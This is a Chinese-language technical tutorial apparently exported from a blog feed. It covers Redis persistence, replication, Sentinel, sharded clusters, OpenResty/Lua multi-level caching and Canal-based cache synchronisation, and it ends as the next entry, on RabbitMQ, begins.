| **配置项** | **刷盘时机** | **优点**               | **缺点**                     |
| ---------- | ------------ | ---------------------- | ---------------------------- |
| Always     | 同步刷盘     | 可靠性高，几乎不丢数据 | 性能影响大                   |
| everysec   | 每秒刷盘     | 性能适中               | 最多丢失1秒数据              |
| no         | 操作系统控制 | 性能最好               | 可靠性较差，可能丢失大量数据 |

#### AOF文件重写

因为是记录命令，AOF文件会比RDB文件大的多。而且AOF会记录对同一个key的多次写操作，但只有最后一次写操作才有意义。通过执行`bgrewriteaof`命令，可以让AOF文件执行重写功能，用最少的命令达到相同效果。

![image-20220628080642059](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/64a23c6128cfbc25a14181d7353ba8ba-54c26e7.png)

```
如图，AOF原本有三个命令，但是set num 123 和 set num 666都是对num的操作，第二次会覆盖第一次的值，因此第一个命令记录下来没有意义。
所以重写命令后，AOF文件内容就是：mset name jack num 666
```

Redis也会在触发阈值时自动去重写AOF文件。阈值也可以在redis.conf中配置：

```properties
# AOF文件比上次文件 增长超过多少百分比则触发重写
auto-aof-rewrite-percentage 100
# AOF文件体积最小多大以上才触发重写 
auto-aof-rewrite-min-size 64mb 
```

### RDB与AOF对比

RDB和AOF各有自己的优缺点，如果对数据安全性要求较高，在实际开发中往往会**结合**两者来使用。

|                |                        **RDB**                        |                         **AOF**                          |
| -------------- | :---------------------------------------------------: | :------------------------------------------------------: |
| 持久化方式     |                 定时对整个内存做快照                  |                   记录每一次执行的命令                   |
| 数据完整性     |              不完整, 两次备份之间会丢失               |              相对完整, 取决于刷盘fsync策略               |
| 文件大小       |                 会有压缩, 文件体积小                  |                  记录命令, 文件体积很大                  |
| 宕机恢复速度   |                         很快                          |                            慢                            |
| 数据恢复优先级 |               低, 因为数据完整性不如AOF               |                  高, 因为数据完整性更高                  |
| 系统资源占用   |                 高, 大量CPU和内存消耗                 | 低, 主要是磁盘IO资源, 但AOF重写时会占用大量CPU和内存资源 |
| 使用场景       | 可以容忍数分钟的数据丢失, 追求更快的启动速度/异地容灾 |                 对数据安全性要求较高常见                 |

## Redis主从

### 单机安装Redis

修改redis.conf文件

```properties
# 绑定地址，默认是127.0.0.1，会导致只能在本地访问。修改为0.0.0.0则可以在任意IP访问
bind 0.0.0.0
# 保护模式，关闭保护模式
protected-mode no
# 数据库数量，设置为1
databases 1
```

### 搭建集群

![image-20220629003406235](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d91e30c99ba2dd00c507b61919159265-bdb04a9.png)

集群包含三个节点, 一个主节点, 两个从节点:

|       IP        | PORT  |  角色   |
| :-------------: | :---: | :-----: |
| 192.168.253.138 | 16379 | master  |
| 192.168.253.136 | 16379 | replica |
| 192.168.253.137 | 16379 | replica |

修改redis.conf文件

```properties
# 开启RDB
save 3600 1
save 300 100
save 60 10000
# 关闭AOF
appendonly no
# 声明当前服务所在IP
replica-announce-ip 192.168.253.138
```

### 开启主从关系

现在三个实例还没有任何关系，要配置主从可以使用`replicaof` 或者`slaveof`（5.0以前）命令。

有临时和永久两种模式：

- 修改配置文件（永久生效）

  在redis.conf中添加一行配置：```slaveof <masterip> <masterport>```

  修改从节点redis.conf文件

  ```properties
  # 开启主从
  salveof 192.168.253.138 16379
  # 主服务器密码
  masterauth xxxxxxxx
  ```

- 使用redis-cli客户端连接到redis服务，执行slaveof命令（重启后失效）：

  ```sh
  replicaof <masterip> <masterport>
  ```

> 在5.0以后新增命令`replicaof`，与`salveof`效果一致。

### 查看主从状态

```properties
# 连接 192.168.253.138 16379
redis-cli -h 192.168.253.138 -p 16379
# 查看状态
info replication
```

![image-20220629004316936](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/74ef645ca9681bb7bcc9e22be0e5272f-a217ab3.png)

### 数据同步原理

主从同步由**slave服务器**发起, 总是请求部分同步(`psync`), 由**master服务器**判断全量还是部分同步

![image-20220629041928011](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/053edbebca9ddf6d61ffba2949e30ad1-b4e3d5a.png)

#### 主从同步参数

slave服务器会携带 `ReplicationId` 和 `offset` , 供master服务器判断是否为第一次同步, 是否需要同步

- **Replication Id** 

  简称`replid`，是数据集的标记，id一致则说明是同一数据集。每一个master都有唯一的`replid`，slave则会继承master节点的`replid`

- **offset** 

  偏移量，随着记录在`repl_baklog`中的数据增多而逐渐增大。slave完成同步时也会记录当前同步的`offset`。如果slave的`offset`小于master的`offset`，说明slave数据落后于master，需要更新。

![image-20220629042344127](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dc92a46067b7a5cb46279c1c1ee3b213-8eca55c.png)

#### 主从同步流程

- slave节点请求增量同步

- master节点判断`replid`，发现不一致，拒绝增量同步

- master将完整内存数据生成RDB，发送RDB到slave

- slave清空本地数据，加载master的RDB

- master将RDB期间的命令记录在`repl_baklog`，并持续将log中的命令发送给slave

- slave执行接收到的命令，保持与master之间的同步

> `repl_baklog`大小有上限，写满后会覆盖最早的数据。如果slave断开时间过久，导致尚未备份的数据被覆盖，则无法基于log做增量同步，只能再次全量同步。

### 主从同步配置优化

- 在master中配置`repl-diskless-sync yes`启用无磁盘复制，避免全量同步时的磁盘IO。

- Redis单节点上的内存占用不要太大，减少RDB导致的过多磁盘IO

- 适当通过配置`repl-backlog-size`提高`repl_baklog`的大小，默认` 1mb`, 发现slave宕机时尽快实现故障恢复，尽可能避免全量同步

- 限制一个master上的slave节点数量，如果实在是太多slave，则可以采用主-从-从链式结构，减少master压力

## Redis哨兵

Redis提供了哨兵(Sentinel)机制实现主从集群的自动故障恢复

### 哨兵的作用及原理

#### 哨兵作用

- 监控

  Sentinel 会不断检查您的master和slave是否按预期工作

- 自动故障恢复

  如果master故障，Sentinel会将一个slave提升为master。当故障实例恢复后也以新的master为主

  > 需要将预设master提前配置密码(`masterauth xxxxxx`), 否则宕机修复后会重复请求当前master

- 通知

  Sentinel充当Redis客户端的服务发现来源，当集群发生故障转移时，会将最新信息推送给Redis的客户端

#### 服务状态监控

Sentinel基于心跳机制监测服务状态，每隔1秒向集群的每个实例发送ping命令：

- 主观下线(`sdown`)：如果某sentinel节点发现某实例未在规定时间响应，则认为该实例**主观下线**。

- 客观下线(`odown`)：若超过指定数量（quorum）的sentinel都认为该实例主观下线，则该实例**客观下线**。quorum值最好超过Sentinel实例数量的一半。

![image-20220629073102612](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fddb11e15c0aacc3893d8e5de6b8de0e-7c28a56.png)

#### 选举机制

一旦发现master故障，sentinel需要在salve中选择一个作为新的master，选择依据是这样的：

```
- 首先会判断slave节点与master节点断开时间长短，如果超过指定值（down-after-milliseconds * 10）则会排除该slave节点

- 然后判断slave节点的slave-priority值，越小优先级越高，如果是0则永不参与选举

- 如果slave-prority一样，则判断slave节点的offset值，越大说明数据越新，优先级越高

- 最后判断slave节点的运行id大小，越小优先级越高。
```

#### 故障转移

当选中了其中一个slave为新的master后（例如slave1），故障的转移的步骤如下:

```
- sentinel给备选的slave1节点发送slaveof no one命令，注释redis.conf文件中的原有slaveof数据, 让该节点成为master

- sentinel给所有其它slave发送slaveof 192.168.253.137 16379 命令，修改redis.conf文件中的原有slaveof数据, 让这些slave成为新master的从节点，开始从新的master上同步数据。

- 最后，sentinel将故障节点标记为slave，当故障节点恢复后会自动成为新的master的slave节点
```

![image-20220629073639351](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/be2c9303b6fd0656fc6b1f6223108b55-1eb5e53.png)

### 搭建哨兵集群

搭建一个三节点形成的Sentinel集群，来监管之前的Redis主从集群:

![image-20220629074853804](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b20b5463cc04e7e718495eba56f8770e-590440a.png)

三个sentinel实例信息如下：

| 节点 |       IP        | PORT  |
| ---- | :-------------: | :---: |
| s1   | 192.168.253.141 | 26379 |
| s2   | 192.168.253.142 | 26379 |
| s3   | 192.168.253.143 | 26379 |

#### 修改sentinel.conf配置文件

```shell
vi /usr/local/src/redis-6.2.6/sentinel.conf
```

```properties
# 指定sentinel实例服务端口
port 26379
# 配置后台守护进程运行
daemonize yes
# 记录日志
logfile "/var/log/sentinel.log"
# 执行目录
dir /tmp
# 绑定IP
sentinel announce-ip 192.168.253.141
# 指定监听redis-server的master节点信息
sentinel monitor mymaster 192.168.253.138 16379 2
# 指定redis-server服务密码
sentinel auth-pass mymaster xxxxxxxx
# 指定redis-server服务心跳停止多久时间后进行故障转移
sentinel down-after-milliseconds mymaster 5000
# 指定故障转移超时时间
sentinel failover-timeout mymaster 60000
```

`sentinel monitor mymaster 192.168.253.138 16379 2`：指定主节点信息

- `mymaster`：主节点名称，自定义，任意写
- `192.168.253.138 16379`：主节点的ip和端口
- `2`：选举master时的quorum值

#### 启动

```shell
$ /usr/local/bin/redis-sentinel /usr/local/src/redis-6.2.6/sentinel.conf
```

![image-20220629082401357](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3daf41eb84eceabe9af4359de75122b1-e14956f.png)

![image-20220629080906682](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6494dd165dc404763dcee2d3eadd4792-ba5f276.png)

## Redis分片集群

主从/哨兵机制可以解决高可用、高并发问题. 但仍然存在**海量数据存储问题**和**高并发写**情况下的主从同步问题, 使用Cluster分片集群可以很好地解决问题

![image-20220629222526876](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7644286b4201d87531a60fc61045a491-578e87b.png)

分片集群特征：

- 集群中有多个master，每个master保存不同数据

- 每个master都可以有多个slave节点

- master之间通过ping监测彼此健康状态

- 客户端请求可以访问集群任意节点，最终都会被转发到正确节点

### 搭建分片集群

提供六台服务器, 安装Redis服务, 模拟分片集群

|       IP        | PORT  |  角色  |
| :-------------: | :---: | :----: |
| 192.168.253.136 | 16379 | master |
| 192.168.253.137 | 16379 | master |
| 192.168.253.138 | 16379 | master |
| 192.168.253.141 | 16379 | slave  |
| 192.168.253.142 | 16379 | slave  |
| 192.168.253.143 | 16379 | slave  |

#### 配置redis.con文件

```properties
port 16379
# 开启集群功能
cluster-enabled yes
# 集群的配置文件路径名称，不需要我们创建，由redis自己维护
cluster-config-file nodes.conf
# 节点心跳失败的超时时间
cluster-node-timeout 5000
# 持久化文件存放目录
dir /usr/local/src/redis-6.2.6/work
# 绑定地址
bind 0.0.0.0 -::1
# 让redis后台运行
daemonize yes
# 配置主节点访问密码
masterauth 123456
# 注册的实例ip
replica-announce-ip 192.168.253.xxx
# 保护模式
protected-mode no
# 数据库数量
databases 1
# 日志
logfile /var/log/redis.log
```

#### 启动分片, 创建集群

我们需要执行命令来创建集群，在Redis5.0之前创建集群比较麻烦，5.0之后集群管理命令都集成到了redis-cli中。

- Redis5.0之前

  Redis5.0之前集群命令都是用redis安装包下的src/redis-trib.rb来实现的。因为redis-trib.rb是有ruby语言编写的所以需要安装ruby环境。

  ```shell
  # 安装依赖
  sudo apt install zlib ruby rubygems
  gem install redis
  ```

  然后通过命令来管理集群：

  ```shell
  # 进入redis的src目录
  cd /usr/local/src/redis-6.2.6/src
  # 创建集群
  ./redis-trib.rb create --replicas 1 192.168.253.136:16379 192.168.253.137:16379 192.168.253.138:16379 192.168.253.141:16379 192.168.253.142:16379 192.168.253.143:16379 -a 123456
  ```

- Redis5.0以后

  集群管理以及集成到了redis-cli中，格式如下：

  ```shell
  # 重启redis, 读取配置
  sudo systemctl restart redis
  # 执行分片命令
  > redis-cli --cluster create --cluster-replicas 1 192.168.253.136:16379 192.168.253.137:16379 192.168.253.138:16379 192.168.253.141:16379 192.168.253.142:16379 192.168.253.143:16379 -a 123456
  ```

  命令说明：

  - `redis-cli --cluster`或者`./redis-trib.rb`：代表集群操作命令
  - `create`：代表是创建集群
  - `--replicas 1`或者`--cluster-replicas 1` ：指定集群中每个master的副本个数为1，此时`节点总数 ÷ (replicas + 1)` 得到的就是master的数量。因此节点列表中的前n个就是master，其它节点都是slave节点，随机分配到不同master

![image-20220629221724823](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/20f2c262dcdcf719c4bb3db6ad47bc7e-bb6bbb3.png)

#### 查看集群状态

```shell
$ redis-cli -c -h 192.168.253.136 -p 16379 -a 123456
> cluster info
```

![image-20220629221844279](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/44afac92acf70d89eae293feeb2782c9-cfccd24.png)

```shell
$ redis-cli -c -h 192.168.253.136 -p 16379 -a 123456 cluster nodes
```

![image-20220630023630378](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/40b82fd9536cc437f5c5472643a6c291-3bf0b76.png)

#### 错误处理

```shell
# 报错 (error) CLUSTERDOWN Hash slot not served
redis-cli -a 123456 --cluster fix 192.168.253.136:16379
```

#### 关闭集群

```shell
printf '%s\n' 136 137 138 141 142 143 | xargs -I{} -t redis-cli -h 192.168.253.{} -p 16379 -a 123456 shutdown
```

![image-20220629224002093](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bb28418876ea566b028fc3ddaf5b4e97-dc4b667.png)

### 散列插槽

#### 运行原理

Redis会把每一个master节点映射到0~16383共16384个插槽`hash slot`上，查看集群信息时就能看到：

![image-20220630024330272](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/486f2770d23587cc966f8ffa84b1e3f2-09f0abb.png)

数据key不是与节点绑定，而是与插槽绑定。redis会根据key的有效部分计算插槽值，分两种情况：

- key中包含"`{}`"，且“`{}`”中至少包含1个字符，“`{}`”中的部分是有效部分
- key中不包含“`{}`”，整个key都是有效部分

#### 实例

例如：key是`num`，那么就根据`num`计算，如果是`{order}num`，则根据`order`计算。计算方式是利用CRC16算法得到一个hash值，然后对16384取余，得到的结果就是slot值。

![image-20220630024613851](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8ac5698bea6ee255b1b16666d5fb1565-693a7d6.png)

#### 总结

Redis如何判断某个key应该在哪个实例？

```
- 将16384个插槽分配到不同的实例
- 根据key的有效部分计算哈希值，对16384取余
- 余数作为插槽，寻找插槽所在实例即可
```

如何将同一类数据固定的保存在同一个Redis实例？

```
使用相同的有效部分，例如key都以{typeId}为前缀
```

### 集群伸缩

集群控制通过使用`redis-cli --cluster` 命令执行, 具体参数查看help文档

```shell
$ redis-cli --cluster help
```

```
Cluster Manager Commands:
  create         host1:port1 ... hostN:portN
                 --cluster-replicas <arg>
  check          host:port
                 --cluster-search-multiple-owners
  info           host:port
  fix            host:port
                 --cluster-search-multiple-owners
                 --cluster-fix-with-unreachable-masters
  reshard        host:port
                 --cluster-from <arg>
                 --cluster-to <arg>
                 --cluster-slots <arg>
                 --cluster-yes
                 --cluster-timeout <arg>
                 --cluster-pipeline <arg>
                 --cluster-replace
  rebalance      host:port
                 --cluster-weight <node1=w1...nodeN=wN>
                 --cluster-use-empty-masters
                 --cluster-timeout <arg>
                 --cluster-simulate
                 --cluster-pipeline <arg>
                 --cluster-threshold <arg>
                 --cluster-replace
  add-node       new_host:new_port existing_host:existing_port
                 --cluster-slave
                 --cluster-master-id <arg>
  del-node       host:port node_id
  call           host:port command arg arg .. arg
                 --cluster-only-masters
                 --cluster-only-replicas
  set-timeout    host:port milliseconds
  import         host:port
                 --cluster-from <arg>
                 --cluster-from-user <arg>
                 --cluster-from-pass <arg>
                 --cluster-from-askpass
                 --cluster-copy
                 --cluster-replace
  backup         host:port backup_directory
  help           

For check, fix, reshard, del-node, set-timeout you can specify the host and port of any working node in the cluster.

Cluster Manager Options:
  --cluster-yes  Automatic yes to cluster commands prompts
```

#### 删除节点

```shell
$ redis-cli -p 16379 -a 123456 --cluster del-node 192.168.253.136:16379 3926c0d86253cd6ee7c347c1ee3bff6fa6ea2286
```

![image-20220630103113197](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/53f98a978d48897ba2af52162f935c0d-10cf1be.png)

#### 添加节点

```shell
$ redis-cli -h 192.168.253.138 -p 16379 -a 123456 --cluster add-node 192.168.253.136:16379 192.168.253.138:16379
# 不添加--cluster-slave 选项, 则添加节点136默认为master节点, 且未分配slot插槽
```

![image-20220630103516343](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a1eec4a492b44ee1afdd48f77731dd2-19cb1da.png)

```shell
# 分配插槽
$ redis-cli -h 192.168.253.138 -p 16379 -a 123456 --cluster reshard 192.168.253.141:16379
```

![image-20220630104244715](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/97caddedaded53fdc8e8e1418f967588-093c7d0.png)

### 故障转移

#### master节点宕机

当节点宕机后, cluster集群会自动执行故障转移

```shell
# 监听分片节点状态
$ watch redis-cli -h 192.168.253.141 -p 16379 -a 123456 cluster nodes
# 对137 master节点宕机
$ redis-cli -h 192.168.253.137 -p 16379 -a 123456 shutdown
```

- 节点疑似宕机

  ![image-20220630123906382](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/92c551154e9b52325cd9d7900216844c-0a02f60.png)

- 节点确定下线, 下属slave 143节点提升为master节点

  ![image-20220630124134801](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/79cc74aa6c583a7d586df15b91ba3c6c-0523bb9.png)

#### 重启宕机节点

```shell
# 137节点重启
$ sudo systemctl restart redis
```

- 重启后137节点变为slave

  ![image-20220630124546291](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b0c0e9efe7cf7c3261827b3d3e59aa1b-788cd50.png)

#### 恢复master节点身份

手动故障转移, 利用`cluster failover`命令可以手动让集群中的某个master宕机，切换到执行`cluster failover`命令的这个slave节点，实现无感知的数据迁移。其流程如下:

![image-20220630124810931](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/574982c82498f99b08caa997491c8cd6-c435f27.png)

```shell
$ redis-cli -h 192.168.253.137 -p 16379 -a 123456 cluster failover
```

![image-20220630124856261](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/50823f30b3395e793cac1d3c46a1fb24-50ec881.png)

```
手动的Failover支持三种不同模式：
 - 缺省：默认的流程，如图1~6歩
 - force：省略了对offset的一致性校验
 - takeover：直接执行第5歩，忽略数据一致性、忽略master状态和其它master的意见
```

### 多级缓存

多层缓存框架:

![image-20220630155850718](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/233b5b6fc46a7ea89ee702532bac5b51-c316d84.png)

#### OpenResty

OpenResty® 是一个基于 Nginx的高性能 Web 平台，用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。具备下列特点：

- 具备Nginx的完整功能

- 基于Lua语言进行扩展，集成了大量精良的 Lua 库、第三方模块

- 允许使用Lua自定义业务逻辑、自定义库

```
官方网站： https://openresty.org/cn/
```

安装及使用介绍请查看本文档集合 `Nging中的Lua操作简介 - ngx_lua模块 - OpenResty文档`

#### 实现请求接口访问路由

- **Nginx代理服务器配置**

  修改`nginx/nginx.conf`

  ```shell
  $ vi /etc/nginx/nginx.conf
  ```

  ```nginx
  http {
      include       mime.types;
      default_type  application/octet-stream;
      sendfile        on;
      keepalive_timeout  65;
      # 反向代理
      upstream nginx-cluster{
          hash $request_uri;	# 采取hash策略, 确保同一URI缓存命中
          server 192.168.253.136;
          server 192.168.253.137;
      }
  	server {
          listen       80;
          server_name  localhost;
  
          location / {
              root   html;
              index  index.html index.htm;
          }
          location /api {
              proxy_pass http://nginx-cluster;
          }
  	}
  }
  ```

- **Nginx负载均衡服务器配置**

  OpenResty监听请求

  ```shell
  $ vi /usr/local/openresty/nginx/nginx.conf
  ```

  ```nginx
  http {
      include       	mime.types;
      default_type  	application/octet-stream;
      sendfile        on;
      keepalive_timeout  65;
      # 加载lua 模块  
      lua_package_path "/usr/local/openresty/lualib/?.lua;;";  
      # 加载c模块 
      lua_package_cpath "/usr/local/openresty/lualib/?.so;;";
  
      # 共享字典，也就是本地缓存，名称叫做：item_cache，大小150m
   	lua_shared_dict item_cache 150m; 
  	server {
          listen       80;
          server_name  localhost;
  
          location / {
              root   html;
              index  index.html index.htm;
          }
          location ~ /api/item(\s+) {
       		# 响应类型，这里返回json
       		default_type application/json;
       		# 响应数据由 lua/item.lua这个文件来决定
       		content_by_lua_file lua/item.lua;
   		}
  	}
  }
  ```

#### 编写Lua脚本

在负载均衡服务器上编写Lua脚本实现业务

##### 1.预先封装通用函数

```lua
-- vi /usr/local/openresty/lualib/common.lua
-- 导入redis
local redis = require('resty.redis')
-- 初始化redis
local red = redis:new()
red:set_timeouts(1000, 1000, 1000)

-- 关闭redis连接的工具方法，其实是放入连接池
local function close_redis(red)
    local pool_max_idle_time = 10000 	-- 连接的空闲时间，单位是毫秒
    local pool_size = 100 				--连接池大小
    local ok, err = red:set_keepalive(pool_max_idle_time, pool_size)
    if not ok then
        ngx.log(ngx.ERR, "放入redis连接池失败: ", err)
    end
end

-- 查询redis的方法 ip和port是redis地址，key是查询的key
local function read_redis(ip, port, key)
    -- 获取一个连接
    local ok, err = red:connect(ip, port)
    if not ok then
        ngx.log(ngx.ERR, "连接redis失败 : ", err)
        return nil
    end
    -- 查询redis
    local resp, err = red:get(key)
    -- 查询失败处理
    if not resp then
        ngx.log(ngx.ERR, "查询Redis失败: ", err, ", key = " , key)
    end
    --得到的数据为空处理
    if resp == ngx.null then
        resp = nil
        ngx.log(ngx.ERR, "查询Redis数据为空, key = ", key)
    end
    close_redis(red)
    return resp
end

-- 封装函数，发送http请求，并解析响应
local function read_http(path, params)
    local resp = ngx.location.capture(path,{
        method = ngx.HTTP_GET,
        args = params,
    })
    if not resp then
        -- 记录错误信息，返回404
        ngx.log(ngx.ERR, "http请求查询失败, path: ", path , ", args: ", args)
        ngx.exit(404)
    end
    return resp.body
end
-- 将方法导出
local _M = {  
    close_redis = close_redis,
    read_redis = read_redis,
    read_http = read_http
}  
return _M
```

##### 2.实现服务Lua脚本

查询顺序: Nginx本地缓存->Redis缓存->服务缓存->数据库

```shell
vi /usr/local/openresty/lualib/item.lua
```

```lua
-- 引入cjson模块
local cjson = require "cjson"
-- 引入自定义common工具模块，返回值是common中返回的 _M
local common = require("common")
local read_http = common.read_http
local read_redis = common.read_redis
-- 导入共享词典，本地缓存
local item_cache = ngx.shared.item_cache

-- 封装查询函数
function read_data(key, expire, path, params)
    -- 查询本地缓存
    local val = item_cache:get(key)
    if not val then
        ngx.log(ngx.ERR, "本地缓存查询失败，尝试查询Redis， key: ", key)
        -- 查询Redis缓存
        local val = read_redis("127.0.0.1", 6379, key)
        -- 判断查询结果
        if not val then
            ngx.log(ngx.ERR, "redis查询失败，尝试查询http， key: ", key)
            -- redis查询失败，去查询http
            val = read_http(path, params)
        end
    end
    -- 查询成功，把数据写入本地缓存
    item_cache:set(key, val, expire)
    -- 返回数据
    return val
end

-- 获取路径参数id
local id = ngx.var[1]

-- 查询商品信息
local itemJSON = read_data("item:id:" .. id, 1800,  "/item/" .. id, nil)
-- 查询库存信息
local stockJSON = read_data("item:stock:id:" .. id, 60, "/item/stock/" .. id, nil)

-- JSON转化为lua的table
local item = cjson.decode(itemJSON)
local stock = cjson.decode(stockJSON)

-- 组合数据
item.stock = stock.stock
item.sold = stock.sold

-- 把item序列化为json 返回结果
ngx.say(cjson.encode(item))
```

#### 缓存预热

可以通过服务代码编写, 在项目启动时执行, 将统计热点数据存入Redis缓存,

也可以通过编写Lua脚本预热数据

### 缓存同步

#### 缓存同步策略

缓存数据同步的常见方式有三种：

- **设置有效期**：给缓存设置有效期，到期后自动删除。再次查询时更新

  - 优势：简单、方便
  - 缺点：时效性差，缓存过期之前可能不一致

  - 场景：更新频率较低，时效性要求低的业务

- **同步双写**：在修改数据库的同时，直接修改缓存

  - 优势：时效性强，缓存与数据库强一致

  - 缺点：有代码侵入，耦合度高；
  - 场景：对一致性、时效性要求较高的缓存数据

- **异步通知：**修改数据库时发送事件通知，相关服务监听到通知后修改缓存数据
  - 优势：低耦合，可以同时通知多个缓存服务
  - 缺点：时效性一般，可能存在中间不一致状态
  - 场景：时效性要求一般，有多个服务需要同步

#### 实现方式

- 基于MQ的异步通知流程

  ![image-20220630195602535](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2c85fad3269a63d2eefad2cee13b8d5c-70cfc70.png)

- 基于Canal的异步通知流程

  Canal- 伪装为数据库slave节点, 依据监听binlog, 实现修改数据后同步缓存的动作

​	![image-20220630195703580](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ca1f615d39df6e547affe8dc911e3aa8-12a5778.png)

#### Canal

**Canal **，译意为水道/管道/沟渠，canal是阿里巴巴旗下的一款开源项目，基于Java开发。基于数据库增量日志解析，提供增量数据订阅&消费。GitHub的地址：https://github.com/alibaba/canal

Canal是基于mysql的主从同步来实现的，MySQL主从同步的原理如下：

```
- MySQL master 将数据变更写入二进制日志( binary log），其中记录的数据叫做binary log events
- MySQL slave 将 master 的 binary log events拷贝到它的中继日志(relay log)
- MySQL slave 重放 relay log 中事件，将数据变更反映它自己的数据
```

Canal就是把自己伪装成MySQL的一个slave节点，从而监听master的binary log变化。再把得到的变化信息通知给Canal的客户端，进而完成对其它数据库的同步。

![image-20220630203608645](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/68a701eb0a700e9ffb63c65424ab4a96-04f1082.png)

##### 目标数据库配置

- 配置文件修改

  ```properties
  # $ sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf
  server-id               = 100
  log_bin                 = /var/log/mysql/mysql-bin.log
  expire_logs_days        = 10
  max_binlog_size   		= 100M
  #binlog_do_db           = include_database_name
  binlog_do_db            = redis_project
  # $ sudo service mysql restart
  ```

  配置解读：

  - `log-bin=/var/lib/mysql/mysql-bin.log`：设置binary log文件的存放地址和文件名
  - `binlog-do-db=redis_project`：指定对哪个database记录binary log events

- 创建Canal专用用户, 设定权限

  ```mysql
  create user canal@'%' IDENTIFIED by 'canal';
  GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT,SUPER ON *.* TO 'canal'@'%' identified by 'canal';
  FLUSH PRIVILEGES;
  ```

- 查看master状态

  ```mysql
  show master status;
  ```

  ![image-20220630204741687](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/04ff020e322c4013a1cbc69ff377a628-8d37ba6.png)



##### 安装Canal

```shell
# 安装Java环境
$ sudo apt install openjdk-8-jdk
$ sudo update-alternatives --config java # 切换为java 8
```

```shell
$ wget https://github.com/alibaba/canal/releases/download/canal-1.1.5/canal.deployer-1.1.5.tar.gz 
$ tar -zxvf canal.deployer-1.1.5.tar.gz 
$ tar zxvf canal.deployer-1.1.5.tar.gz
$ mv canal/ /usr/local/src/
```

##### 配置Canal

```properties
# $ vi /usr/local/src/canal/conf/canal.properties
canal.ip =192.168.253.134
canal.destinations = example
```

```properties
# $ vi /usr/local/src/canal/conf/example/instance.properties
canal.instance.gtidon=false
canal.instance.master.address=192.168.253.134:3306
canal.instance.tsdb.enable=true
canal.instance.dbUsername=canal
canal.instance.dbPassword=canal
canal.instance.connectionCharset = UTF-8
canal.instance.filter.regex=redis_project\\..*
```

`canal.instance.filter.regex=`：要监听的表名称. 表名称监听支持的语法：

```
mysql 数据解析关注的表，Perl正则表达式.
多个正则之间以逗号(,)分隔，转义符需要双斜杠(\\) 
常见例子：
1.  所有表：.*   or  .*\\..*
2.  canal schema下所有表： canal\\..*
3.  canal下的以canal打头的表：canal\\.canal.*
4.  canal schema下的一张表：canal.test1
5.  多个规则组合使用然后以逗号隔开：canal\\..*,mysql.test1,mysql.test2 
```

##### 运行Canal

```shell
$ cd /usr/local/src/canal
$ ./bin/startup.sh
```

##### 查看运行状态

![image-20220630220358545](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/dca012489d2a146e108afc3ad238c15a-d03a42b.png)

![image-20220630220415716](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/af3ec2385ef43a8d8c9d68784af65f82-a28f3be.png)

##### 代码处理

```shell
$ composer require xingwenge/canal_php
```

```php
<?php

use xingwenge\canal_php\CanalClient;
use xingwenge\canal_php\CanalConnectorFactory;
use xingwenge\canal_php\Fmt;

require_once 'vendor/autoload.php';

try {
    $client = CanalConnectorFactory::createClient(CanalClient::TYPE_SOCKET_CLUE);

    $client->connect("192.168.253.134", 11111);
    $client->checkValid();
    $client->subscribe("1001", "example", ".*\\..*");

    while (true) {
        $message = $client->get(100);
        if ($entries = $message->getEntries()) {
            foreach ($entries as $entry) {
                var_dump($entries);
                Fmt::println($entry);
            }
            break;
        }

        sleep(1);
    }

    $client->disConnect();
} catch (\Exception $e) {
    echo $e->getMessage(), PHP_EOL;
}
```

##### 修改数据库数据显示

![image-20220630220542533](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ef50a6406a7a480190929c6fdc18ca69-5625fa6.png)

### 最终方案流程

![image-20220630221530358](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3b017a7ac171f084a4d36006bf45f73d-b57412d.png)]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ使用问题及高可用方案</title>
    <url>/2022/04/14/MQ/RabbitMQ/RabbitMQ%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98%E5%8F%8A%E9%AB%98%E5%8F%AF%E7%94%A8%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[
# RabbitMQ使用问题及高可用方案

## 应用问题

### 消息可靠性保障

如何100%确保消息发送成功

- **RabbitMQ特性**

  - **生产者消息确认**

    ```php
    $channel = $connection->channel();
    $channel->set_ack_handler(
        function (AMQPMessage $message) {
            echo 'Message acked with content ' . $message->body . PHP_EOL;
        }
    );
    
    $channel->set_nack_handler(
        function (AMQPMessage $message) {
